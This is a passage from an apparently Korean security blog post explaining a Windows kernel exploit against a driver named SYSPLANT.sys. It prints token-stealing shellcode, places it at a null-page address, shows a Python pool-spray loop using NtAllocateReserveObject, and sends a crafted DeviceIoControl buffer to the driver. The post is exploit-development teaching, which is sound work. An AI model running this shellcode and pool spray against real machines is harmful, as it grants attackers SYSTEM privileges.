</span><span class='line'>...
</span><span class='line'>+0x04c OkayToCloseProcedure : (null)</span></code></pre></td></tr></table></div></figure>


<p><code>0x28</code> + <code>0x4c</code> = <code>0x74</code> 이니까, <code>Type Index</code> 를 0 으로 세팅하면 <code>0x00000000 + 0x74</code> 에서 <code>OkayToCloseProcedure</code> 를 읽게된다.</p>

<h4>allocShellcode()</h4>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>"\x42" * 0x70
</span><span class='line'>
</span><span class='line'>OkayToCloseProcedure (0x00000078)
</span><span class='line'>
</span><span class='line'>ADD ESI,0C
</span><span class='line'>MOV DWORD PTR DS:[ESI],8000A
</span><span class='line'>SUB ESI,0C # RESTORE TypeIndex
</span><span class='line'>
</span><span class='line'>xor eax,eax # Token stealing shellcode
</span><span class='line'>mov eax,DWORD PTR fs:[eax+0x124]
</span><span class='line'>mov eax,DWORD PTR [eax+0x50]
</span><span class='line'>mov ecx,eax
</span><span class='line'>loc_0000000e:
</span><span class='line'>mov eax,DWORD PTR [eax+0xb8]
</span><span class='line'>sub eax,0xb8
</span><span class='line'>cmp DWORD PTR [eax+0xb4],0x4
</span><span class='line'>jne loc_0000000e
</span><span class='line'>mov edx,DWORD PTR [eax+0xf8]
</span><span class='line'>mov DWORD PTR [ecx+0xf8],edx
</span><span class='line'>ret 0x10
</span><span class='line'>
</span><span class='line'>"\x90"
</span><span class='line'>"\x90"
</span><span class='line'>...</span></code></pre></td></tr></table></div></figure>


<p>이 쉘코드를 NtAllocateVirtualMemory() 로 <code>0x00000004</code> 에 allocate 한다.</p>

<h4>Spray()</h4>

<p>Spray the kernel pool with IoCompletionReserve objects. Each object is 0x60 bytes in length and is allocated
from the non-paged kernel pool.</p>

<p>When applications need failure-free delivery of an I/O completion port message, or packet. Typically,
packets are sent with the PostQueuedCompletionStatus API in Kernelbase.dll, which calls NtSetIoCompletion
API. Similarly to the user APC, the kernel must allocate an I/O manager structure to contain the completion-packet information,
and if this allocation failes, the packet cannot be created. With reserve objects, the application can use the
NtAllocateReserveObject API on startup to have the kernel pre-allocate the I/O completion packet, and the
NtSetIoCompletionEx system call can be used to supply a handle to this reserve object, guaranteeing a success path.</p>

<p>exploit 을 시작할 시점에는 kernel pool 이 fragmented 되어있기 마련이라, 구멍을 채워줘야한다. 현재 있는 page 들을 꽉 채우고,
그 이후부터 allocation 을 때리면, 새로운 page 에 sequential 하게 일어날 가능성이 높아진다.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>global handles, done
</span><span class='line'>handles = {}
</span><span class='line'>for i in range(0,5000):
</span><span class='line'>    hHandle = HANDLE(0)
</span><span class='line'>    ntdll.NtAllocateReserveObject(byref(hHandle), 0x0, IO_COMPLETION_OBJECT)
</span><span class='line'>    handles[hHandle.value] = hHandle</span></code></pre></td></tr></table></div></figure>


<ul>
<li><a href="https://github.com/JeremyFetiveau/Exploits/blob/master/MS10-058.cpp">Exploits for MS10-058, Jeremy Fetiveau</a></li>
<li><a href="http://blog.ptsecurity.com/2013/03/stars-aligners-how-to-kernel-pool.html">Stars aligner’s how-to: kernel pool spraying and VMware CVE-2013-1406</a></li>
</ul>


<h4>NtAllocateReserveObject()</h4>

<p>In short, <code>NtAllocateReserveObject</code> makes it possible for any system user to allocate a buffer
on the non-paged kernel pool, and obtain a HANDLE representation of this buffer in user-mode.
As it will turn out later in this paper, the above can give us pretty much control over the
kernel memory, when exploiting custom vulnerabilities.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>#define APC_OBJECT              0
</span><span class='line'>#define IO_COMPLETION_OBJECT    1
</span><span class='line'>#define MAX_OBJECT_ID           1
</span><span class='line'>
</span><span class='line'>NTSTATUS STDCALL NtAllocateReserveObject(
</span><span class='line'>    OUT PHANDLE hObject,
</span><span class='line'>    IN  POBJECT_ATTRIBUTE ObjectAttributes,
</span><span class='line'>    IN  DWORD ObjectType)
</span><span class='line'>{
</span><span class='line'>    PVOID ObjectBuffer;
</span><span class='line'>    HANDLE hOutputHandle;
</span><span class='line'>    NTSTATUS NtStatus;
</span><span class='line'>
</span><span class='line'>    if (PreviousMode == UserMode) {
</span><span class='line'>        // Validate hObject
</span><span class='line'>    }
</span><span class='line'>    if (ObjectType &gt; MAX_OBJECT_ID) {
</span><span class='line'>        /* Bail out: STATUS_INVALID_PARAMETER
</span><span class='line'>         */
</span><span class='line'>    } else {
</span><span class='line'>        NtStatus = ObCreateObject(PreviousMode,
</span><span class='line'>                                    PspMemoryReserveObjectTypes[ObjectType],
</span><span class='line'>                                    ObjectAttributes,
</span><span class='line'>                                    PreviousMode,
</span><span class='line'>                                    0,
</span><span class='line'>                                    PspMemoryReserveObjectSizes[ObjectType],
</span><span class='line'>                                    0,
</span><span class='line'>                                    0,
</span><span class='line'>                                    &ObjectBuffer);
</span><span class='line'>        if (!NT_SUCCESS(NtStatus))
</span><span class='line'>            /* Bail out: NtStatus
</span><span class='line'>             */
</span><span class='line'>
</span><span class='line'>        memset(ObjectBuffer, 0, PspMemoryReserveObjectSizes[ObjectType]);
</span><span class='line'>
</span><span class='line'>        if (ObjectType == IO_COMPLETION) {
</span><span class='line'>            //
</span><span class='line'>            // Perform some ObjectBuffer initialization
</span><span class='line'>            //
</span><span class='line'>            ObjectBuffer[0x0C] = 3;
</span><span class='line'>            ObjectBuffer[0x20] = PspIoMiniPacketCallbackRoutine;
</span><span class='line'>            ObjectBuffer[0x24] = ObjectBuffer;
</span><span class='line'>            ObjectBuffer[0x28] = 0;
</span><span class='line'>        }
</span><span class='line'>        NtStatus = ObInsertObjectEx(ObjectBuffer,
</span><span class='line'>                                    &hOutputHandle,
</span><span class='line'>                                    0,
</span><span class='line'>                                    0xF0003,
</span><span class='line'>                                    0,
</span><span class='line'>                                    0,
</span><span class='line'>                                    0);
</span><span class='line'>        if (!NT_SUCCESS(NtStatus))
</span><span class='line'>            /* Bail out: NtStatus
</span><span class='line'>             */
</span><span class='line'>        *hObject = hOutputHandle;
</span><span class='line'>    }
</span><span class='line'>    return NtStatus;
</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>


<h4>DeviceIoControl()</h4>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>BOOL WINAPI DeviceIoControl(HANDLE hDevice,
</span><span class='line'>                            DWORD dwIoControlCode,
</span><span class='line'>                            LPVOID lpInBuffer,
</span><span class='line'>                            DWORD nInBufferSize,
</span><span class='line'>                            LPVOID lpOutputBuffer,
</span><span class='line'>                            DWORD nOutBufferSize,
</span><span class='line'>                            LPDWORD lpBytesReturned,
</span><span class='line'>                            LPOVERLAPPED lpOverlapped);</span></code></pre></td></tr></table></div></figure>


<p>파라메터중에서 중요한 것은 <code>hDevice</code>, <code>dwIoControlCode</code>, <code>lpInBuffer</code>, <code>lpOutputBuffer</code>.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>dwReturn = c_ulong()
</span><span class='line'>
</span><span class='line'>evil_input = "\x41" * 4 + struct.pack("&lt;L", 0x00222084) + "D" * 56
</span><span class='line'>
</span><span class='line'>evil_size = len(evil_input)
</span><span class='line'>einput = create_string_buffer(evil_input, evil_size)
</span><span class='line'>eoutput = create_string_buffer("\x00" * 1024, 1024)
</span><span class='line'>driver_handle = kernel32.CreateFilwW( u"\\\\.\\SYSPLANT", GENERIC_READ | GENERIC_WRITE, 0, None, OPEN_EXISTING, 0, None)
</span><span class='line'>...
</span><span class='line'>kernel32.DeviceIoControl(driver_handle, 0x00222084, 
</span><span class='line'>                            addressof(einput), evil_size, 
</span><span class='line'>                            addressof(eoutput), 1024, 
</span><span class='line'>                            byref(dwReturn), None)</span></code></pre></td></tr></table></div></figure>


<p>이 커맨드가 <code>SYSPLANT.sys</code> 의 <code>DriverDispatcher()</code> 에 날라가면 <code>SYSFER.dll</code> 의 <code>child_block</code> 에 담가둔 오염된 데이터때문에 <code>SYSPLANT.sys</code> 가 뻘짓을 하게 되는 흐름.</p>
</div>
  
  


    </article>
  
  <div class="pagination">
    
      <a class="prev" href="/posts/7">&larr; Older</a>
    
    <a href="/blog/archives">Blog Archives</a>
    
    <a class="next" href="/posts/5">Newer &rarr;</a>
    
  </div>
</div>
<aside class="sidebar">
  
    <section>
  <h1>Recent Posts</h1>
  <ul id="recent_posts">
    
      <li class="post">
        <a href="/blog/2016/01/11/bsides-vienna-2015-writing-your-first-windows-exploit-in-less-than-one-hour/">BSides Vienna 2015: Writing Your First Windows Exploit in Less Than One Hour</a>
      </li>
    
      <li class="post">
        <a href="/blog/2016/01/11/sock-sendpage/">Sock_sendpage</a>
      </li>
    
      <li class="post">
        <a href="/blog/2015/12/23/on-the-juniper-backdoor/">On the Juniper Backdoor</a>
      </li>
    
      <li class="post">
        <a href="/blog/2015/12/07/trustnone/">TRUSTNONE</a>
      </li>
    
      <li class="post">
        <a href="/blog/2015/10/04/return-oriented-programming-for-the-arm-architecture/">Return Oriented Programming for the ARM Architecture</a>
      </li>
    
  </ul>
</section>





  
</aside>

    </div>
  </div>
  <footer role="contentinfo"><p>
  Copyright &copy; 2016 - KC -
  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
</p>

</footer>
  







  <script type="text/javascript">
    (function(){
      var twitterWidgets = document.createElement('script');
      twitterWidgets.type = 'text/javascript';
      twitterWidgets.async = true;
      twitterWidgets.src = '//platform.twitter.com/widgets.js';
      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
    })();
  </script>





</body>
</html>
